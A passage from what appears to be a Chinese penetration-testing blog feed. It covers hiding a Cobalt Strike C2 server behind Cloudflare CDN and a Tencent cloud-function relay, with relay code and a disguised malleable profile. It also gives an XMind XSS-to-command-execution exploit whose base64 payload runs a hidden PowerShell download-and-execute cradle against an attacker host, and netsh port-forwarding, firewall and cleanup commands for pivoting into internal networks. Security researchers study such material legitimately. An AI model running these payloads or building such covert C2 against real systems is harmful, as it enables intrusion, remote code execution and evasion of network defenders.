title="配置CND服务器"></a>配置CND服务器</h5><p>这里我就用，CloudFlare做做测试了，把域名接入到CloudFlare管理，设置默认CDN加速</p><p>接入域名后，并添加个A记录域名，开启CDN加速</p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/7.png" alt="7"></p><p>设置完成后解析下，我们的添加的A记录域名</p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/8.png" alt="8"></p><h5 id="CS的Listeners配置-1"><a href="#CS的Listeners配置-1" class="headerlink" title="CS的Listeners配置"></a>CS的Listeners配置</h5><p>Cloudflare支持的HTTP端口是： 80,8080,8880,2052,2082,2086,2095</p><p>Cloudflare支持的HTTPs端口是： 443,2053,2083,2087,2096,8443</p><h6 id="CDNhttp上线"><a href="#CDNhttp上线" class="headerlink" title="CDNhttp上线"></a><strong>CDNhttp上线</strong></h6><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/9.png" alt="9"></p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/10.png" alt="10"></p><p>成功上线</p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/11.png" alt="11"></p><p>抓包流量走的都是CDN的IP</p><h6 id="CDNhttps上线"><a href="#CDNhttps上线" class="headerlink" title="CDNhttps上线"></a><strong>CDNhttps上线</strong></h6><p>CS使用CDN后，可以一定程度隐藏IP地址，使用WireShark抓包交互IP都是CDN地址，但是传输协议使用的HTTP，传输内容是没有加密的，如果要加密，则可以使用HTTPS。</p><p>还以CloudFlare为例，切换到SSL&#x2F;TLS栏，证书类型选择完全，如下图：</p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/12.png" alt="12"></p><p>切换到源服务器，创建证书保存<strong>私钥和证书</strong></p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/13.png" alt="13"></p><p>将生成的内容分别存储为1.pem和1.key（名字可以随便起），传到CS所在的服务器，然后生成新的store文件，执行下面命令，生成相关的store文件：命令中xxx.xxxx.com替换为自己的域名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl pkcs12 -<span class="hljs-built_in">export</span> -<span class="hljs-keyword">in</span> 1.pem -inkey 1.key -out a.p12 -name xxx.xxxx.com -passout pass:123456<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore https.store -srckeystore a.p12 -srcstoretype PKCS12 -srcstorepass 123456 -<span class="hljs-built_in">alias</span> xxx.xxxx.com<br></code></pre></td></tr></table></figure><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/14.png" alt="14"></p><p>最后需要更改cs的配置文件中https-certificate的配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">https-certificate &#123;<br>    <span class="hljs-built_in">set</span> keystore <span class="hljs-string">&quot;https.store&quot;</span>;<br>    <span class="hljs-built_in">set</span> password <span class="hljs-string">&quot;123456&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/15.png" alt="15"></p><p>重启teamserver设置Listeners</p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/16.png" alt="16"></p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/17.png" alt="17"></p><p>抓包查看，流量已经SSL&#x2F;TLS加密，流量的IP是DNS服务器的IP</p><h2 id="4-云函数上线"><a href="#4-云函数上线" class="headerlink" title="4 云函数上线"></a>4 云函数上线</h2><p>云函数还是得益于Serverless架构，或者称为无服务器架构，是最近几年新冒出来的一种架构风格，仅需用户编写和上传核心业务代码，交由平台完成部署、调度、流量分发、弹性伸缩等能力。</p><p>我们就可以利用云函数，配置个流量转发，C2Client访问云函数，云函数将流量转发到咱们的C2服务器，一般云函数服务器都会配置CDN，这样速度还行，还可以达对C2服务器的隐藏。</p><h4 id="前期准备-2"><a href="#前期准备-2" class="headerlink" title="前期准备"></a>前期准备</h4><ol><li>支持云函数的厂商azure，tencent都可</li><li>国外vps服务器，可以选择Vultr之类的，实在没用就用国内的也行</li></ol><h4 id="正文-2"><a href="#正文-2" class="headerlink" title="正文"></a>正文</h4><h5 id="云函数配置"><a href="#云函数配置" class="headerlink" title="云函数配置"></a>云函数配置</h5><p>这里我们用tencent做测试，在控制台中找到云函数，创建给新的云函数服务，选择自定义，python3.6环境</p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/18.png" alt="18"></p><p>代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf8 -*-</span><br><span class="hljs-keyword">import</span> json,requests,base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main_handler</span>(<span class="hljs-params">event, context</span>):<br>    C2=<span class="hljs-string">&#x27;http://&lt;C2服务器地址&gt;&#x27;</span> <span class="hljs-comment"># 这里可以使用 HTTP、HTTPS~下角标~</span><br>    path=event[<span class="hljs-string">&#x27;path&#x27;</span>]<br>    headers=event[<span class="hljs-string">&#x27;headers&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(event)<br>    <span class="hljs-keyword">if</span> event[<span class="hljs-string">&#x27;httpMethod&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span> :<br>        resp=requests.get(C2+path,headers=headers,verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">else</span>:<br>        resp=requests.post(C2+path,data=event[<span class="hljs-string">&#x27;body&#x27;</span>],headers=headers,verify=<span class="hljs-literal">False</span>)<br>        <span class="hljs-built_in">print</span>(resp.headers)<br>        <span class="hljs-built_in">print</span>(resp.content)<br><br>    response=&#123;<br>        <span class="hljs-string">&quot;isBase64Encoded&quot;</span>: <span class="hljs-literal">True</span>,<br>        <span class="hljs-string">&quot;statusCode&quot;</span>: resp.status_code,<br>        <span class="hljs-string">&quot;headers&quot;</span>: <span class="hljs-built_in">dict</span>(resp.headers),<br>        <span class="hljs-string">&quot;body&quot;</span>: <span class="hljs-built_in">str</span>(base64.b64encode(resp.content))[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>]<br>    &#125;<br>    <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/19.png" alt="19"></p><p>配置触发器，选择自定义，触发版本选择LATEST最新，触发方式选择API网关触发，这里的API网关触发，根据文档介绍可知它的机制，即将请求内容以参数形式传递给函数，并将函数的返回作为响应的内容。其它选项默认即可。</p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/20.png" alt="20"></p><p>云函数，配置完成后，我们还要配置下API网关</p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/21.png" alt="21"></p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/22.png" alt="22"></p><p>将路径改为根路径()</p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/23.png" alt="23"></p><p>更改完成后，即可发布服务，完成后，可以在api服务的基础信息中看到<strong>公网的默认访问地址</strong>，有80和443两个端口，配置的CS监听地址是http就用80端口，https就用443端口</p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/24.png" alt="24"></p><h5 id="CS的Listeners配置-2"><a href="#CS的Listeners配置-2" class="headerlink" title="CS的Listeners配置"></a>CS的Listeners配置</h5><p>配置CS Profile，内容这里参考下面示例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs shell">set sample_name &quot;t&quot;;<br>set sleeptime &quot;3000&quot;;<br>set jitter   &quot;0&quot;;<br>set maxdns   &quot;255&quot;;<br>set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;<br><br>http-get &#123;<br><br>  set uri &quot;/api/x&quot;;<br><br>  client &#123;<br>      header &quot;Accept&quot; &quot;*/*&quot;;<br>      metadata &#123;<br>          base64;<br>          prepend &quot;SESSIONID=&quot;;<br>          header &quot;Cookie&quot;;<br>      &#125;<br>  &#125;<br><br>  server &#123;<br>      header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;<br>      header &quot;content-transfer-encoding&quot; &quot;binary&quot;;<br>      header &quot;Server&quot; &quot;Nodejs&quot;;<br>      output &#123;<br>          base64;<br>          print;<br>      &#125;<br>  &#125;<br>&#125;<br>http-stager &#123;<br>  set uri_x86 &quot;/vue.min.js&quot;;<br>  set uri_x64 &quot;/bootstrap-2.min.js&quot;;<br>&#125;<br>http-post &#123;<br>  set uri &quot;/api/y&quot;;<br>  client &#123;<br>      header &quot;Accept&quot; &quot;*/*&quot;;<br>      id &#123;<br>          base64;<br>          prepend &quot;JSESSION=&quot;;<br>          header &quot;Cookie&quot;;<br>      &#125;<br>      output &#123;<br>          base64;<br>          print;<br>      &#125;<br>  &#125;<br><br>  server &#123;<br>      header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;<br>      header &quot;content-transfer-encoding&quot; &quot;binary&quot;;<br>      header &quot;Connection&quot; &quot;keep-alive&quot;;<br>      output &#123;<br>          base64;<br>          print;<br>      &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/25.png" alt="25"></p><p>Listeners的host和Hosts和Stager Host都设置为你的云函数URL</p><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/26.png" alt="26"></p><p>抓包看流量，C2通信的HOST是api的域名IP是腾讯云的CDN服务器IP</p><p>我的博客<a href="https://kosakd.top/">kosakd blog</a></p>]]></content>
    
    
    <categories>
      
      <category>技术分享</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>笔记</tag>
      
      <tag>CobaltStrike教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xmind命令执行漏洞复现</title>
    <link href="/2021/05/12/Xmind%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/05/12/Xmind%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p><img src="/Xmind%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/sao.png" alt="s"></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>XMind 是一款专业的全球领先的商业思维导图软件，在国内使用广泛，拥有强大的功能、包括思维管理、商务演示、与办公软件协同工作等功能。它采用全球先进的Eclipse RCP软件架构，是集思维导图与头脑风暴于一体的可视化思考工具，能用来捕捉想法、理清思路、管理复杂信息并促进团队协作。XMind思维导图软件曾被著名互联网媒体Lifehacker评选为“最佳头脑风暴和思维导图工具”及”最受欢迎的思维导图软件”。</p><span id="more"></span><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>XMind 2020—XMind 2021 bate11 都存在此漏洞</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>到官网下载最新版本的XMind并安装</p><p><img src="/Xmind%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p><p><img src="/Xmind%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png" alt="2"></p><p><img src="/Xmind%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png" alt="3"></p><p><img src="/Xmind%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.png" alt="4"></p><h3 id="打开，测试xss漏洞"><a href="#打开，测试xss漏洞" class="headerlink" title="打开，测试xss漏洞"></a>打开，测试xss漏洞</h3><p><strong>创建个模板，在主题中输入，payload，然后点击大纲，在大纲页面保存或者光标移到主题栏然后下移都能触发漏洞</strong></p><p><strong>xss payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;img src=<span class="hljs-number">1</span> onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure><p><img src="/Xmind%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/5.png" alt="5"></p><p>构造执行命令<strong>payload</strong></p><p>whoami</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> tenet = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)<br>tenet.<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">error, stdout, stderr</span>)=&gt;</span>&#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);<br>  &#125;);<br><br></code></pre></td></tr></table></figure><p><strong>base64</strong>编码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">Y29uc3QgdGVuZXQgPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykKdGVuZXQuZXhlYygnd2hvYW1pJywoZXJyb3IsIHN0ZG91dCwgc3RkZXJyKT0+ewogICAgYWxlcnQoYHN0ZG91dDogJHtzdGRvdXR9YCk7CiAgfSk7<br></code></pre></td></tr></table></figure><p>最终<strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;img src=x onerror=&#x27;eval(new Buffer(`Y29uc3QgdGVuZXQgPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykKdGVuZXQuZXhlYygnd2hvYW1pJywoZXJyb3IsIHN0ZG91dCwgc3RkZXJyKT0+ewogICAgYWxlcnQoYHN0ZG91dDogJHtzdGRvdXR9YCk7CiAgfSk7`,`base64`).toString())&#x27;&gt;<br></code></pre></td></tr></table></figure><p><img src="/Xmind%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/6.png" alt="6"></p><p>执行ipconfig &#x2F;all</p><p><img src="/Xmind%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/7.png" alt="7"></p><p>cs上线</p><p>采用PowerShell上线</p><p><img src="/Xmind%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/8.png" alt="8"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.26:80/xmind&#x27;))&quot;</span><br></code></pre></td></tr></table></figure><p>构造执行命令payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> tenet = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)<br>tenet.<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(\&#x27;http://192.168.1.26:80/xmind\&#x27;))&quot;&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">error, stdout, stderr</span>)=&gt;</span>&#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);<br>  &#125;);<br></code></pre></td></tr></table></figure><p><strong>base64</strong>编码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">Y29uc3QgdGVuZXQgPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykKdGVuZXQuZXhlYygncG93ZXJzaGVsbC5leGUgLW5vcCAtdyBoaWRkZW4gLWMgIklFWCAoKG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoXCdodHRwOi8vMTkyLjE2OC4xLjI2OjgwL3htaW5kXCcpKSInLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs=<br></code></pre></td></tr></table></figure><p>最终<strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;img src=x onerror=<span class="hljs-string">&#x27;eval(new Buffer(`Y29uc3QgdGVuZXQgPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykKdGVuZXQuZXhlYygncG93ZXJzaGVsbC5leGUgLW5vcCAtdyBoaWRkZW4gLWMgIklFWCAoKG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCkuZG93bmxvYWRzdHJpbmcoXCdodHRwOi8vMTkyLjE2OC4xLjI2OjgwL3htaW5kXCcpKSInLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs=`,`base64`).toString())&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><img src="/Xmind%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/9.png" alt="9"></p><p>成功上线</p>]]></content>
    
    
    <categories>
      
      <category>技术分享</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>笔记</tag>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透之端口转发，socket代理</title>
    <link href="/2021/05/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%8Csocket%E4%BB%A3%E7%90%86/"/>
    <url>/2021/05/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%8Csocket%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%8Csocket%E4%BB%A3%E7%90%86/sao.png" alt="s"></p><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>当我们获取到一台，边缘（DMZ）服务器的Shell,时该如何进行下一步渗透呢？</p><p>如果我们要进行下一步的渗透操作，这个时候，我们就要先进行内网信息收集，一般DMZ服务器，都会有两个网卡，一个是隔离的外网网卡，一个是内网网卡，但内网是一般都不会通外网的，这个时候，我们就要进行，本地端口转发了（端口映射），这里可以用到win上的工具<strong>netsh</strong></p><span id="more"></span><p>**<code>netsh</code>**，是微软Windows的netsh是一个命令行脚本实用工具。使用netsh工具 ，可以查看或更改本地计算机或远程计算机的网络配置。不仅可以在本地计算机上运行这些命令，而且可以在网络上的远程计算机上运行。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd">假设，这台机子是一台web服务器<br>网卡<span class="hljs-number">1</span>:<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">147</span>.<span class="hljs-number">129</span> ~假设为公网ip，可以出外网，但是此网卡不能访问内网<br><br>网卡<span class="hljs-number">2</span>:<span class="hljs-number">169</span>.<span class="hljs-number">254</span>.<span class="hljs-number">83</span>.<span class="hljs-number">245</span> ~假设为内网ip，可以访问内网资源，但是不能出外网<br><br></code></pre></td></tr></table></figure><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%8Csocket%E4%BB%A3%E7%90%86/1.png" alt="1"></p><p>我们要做的是，在网卡2，开启个socket5服务，然后将网卡2的socket5服务端口，转到网卡1的端口上，我们就可以连接，网卡1的端口，进行socket5代理，这样就能通过外网进行内网渗透了。</p><p>这里socket5代理，我就用远程连接服务来代替，这样直观了解些</p><h3 id="设置转发规则"><a href="#设置转发规则" class="headerlink" title="设置转发规则"></a>设置转发规则</h3><p><strong>netsh操作需要管理员权限</strong></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-number">1</span>.先查看下当前配置的转发规则<br>netsh interface portproxy show all<br></code></pre></td></tr></table></figure><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%8Csocket%E4%BB%A3%E7%90%86/3.png" alt="3"></p><p>现在未添加转发规则</p><p>我们来添加一条转发规则，我们把内网的3389端口转发到外网的9696端口</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmd">netsh interface portproxy add v4tov4 listenport=<span class="hljs-number">9696</span> listenaddress=<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">147</span>.<span class="hljs-number">129</span> connectport=<span class="hljs-number">3389</span> connectaddress=<span class="hljs-number">169</span>.<span class="hljs-number">254</span>.<span class="hljs-number">83</span>.<span class="hljs-number">245</span><br><span class="hljs-function"></span><br><span class="hljs-function">listenport:为网卡1端口</span><br><span class="hljs-function"><span class="hljs-title">listenaddress</span>:为网卡1<span class="hljs-title">ip</span></span><br><span class="hljs-function"><span class="hljs-title">connectport</span>:为网卡2端口</span><br><span class="hljs-function"><span class="hljs-title">connectaddress</span>：为网卡2<span class="hljs-title">ip</span></span><br></code></pre></td></tr></table></figure><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%8Csocket%E4%BB%A3%E7%90%86/4.png" alt="4"></p><h3 id="设置防火墙规则"><a href="#设置防火墙规则" class="headerlink" title="设置防火墙规则"></a>设置防火墙规则</h3><p>规则已经添加进去了，现在我们要查看防火墙，如果开启了防火墙，要对其添加一条，监听端口允许入站规则<br>或者直接关闭防火墙，但一般不推荐关闭防火墙</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmd">查看防火墙是否开启<br>netsh firewall show config<br>关闭防火墙<br>netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off<br>开启服防火墙<br>netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state on<br></code></pre></td></tr></table></figure><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%8Csocket%E4%BB%A3%E7%90%86/2.png" alt="2"></p><p>当前服务器开启了防火墙，我们要添加一条入站规则</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">添加一条名为test的入站规则，端口放行<span class="hljs-number">9696</span><br>netsh advfirewall firewall add rule name=test <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> action=allow protocol=tcp localport=<span class="hljs-number">9696</span> <br></code></pre></td></tr></table></figure><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%8Csocket%E4%BB%A3%E7%90%86/5.png" alt="5"></p><p>添加成功后，我们连接网卡1的9696端口，流量就会转发到网卡2的3389端口上了</p><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%8Csocket%E4%BB%A3%E7%90%86/6.png" alt="6"></p><h3 id="删除规则"><a href="#删除规则" class="headerlink" title="删除规则"></a>删除规则</h3><p>端口转发成功了，接下来是，删除规则，当我们干完活记得搽屁股</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">删除指定端口转发规则<br><br>netsh interface portproxy delete v4tov4 listenport=<span class="hljs-number">9696</span> listenaddress=<br></code></pre></td></tr></table></figure><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%8Csocket%E4%BB%A3%E7%90%86/7.png" alt="7"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">删除入站规则<br>netsh advfirewall firewall delete rule name=test <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> protocol=tcp localport=<span class="hljs-number">9696</span><br></code></pre></td></tr></table></figure><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%8Csocket%E4%BB%A3%E7%90%86/8.png" alt="8"></p><h2 id="socket5代理"><a href="#socket5代理" class="headerlink" title="socket5代理"></a>socket5代理</h2><p>当我们获取到DMZ服务器的shell后要进行内网渗透时，我们要对内网资源进行一个信息搜集，我们的扫描器又不能通过外网直接扫描他们的内网，这时侯就要用，socket5代理服务了，在DMZ服务器上运行个socket5代理服务，用代理工具连接，流量就通过DMZ服务器的socket5服务转到内网了，这样我们就能够，扫描到内网了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">本来，是打算给你们用我写的socket5服务程序的，但是写完后，发现，猪猪侠大佬的s5程序比我写的好，这里就用猪猪侠的s5了，地址如下<br>https://github.com/ring04h/s5.go<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 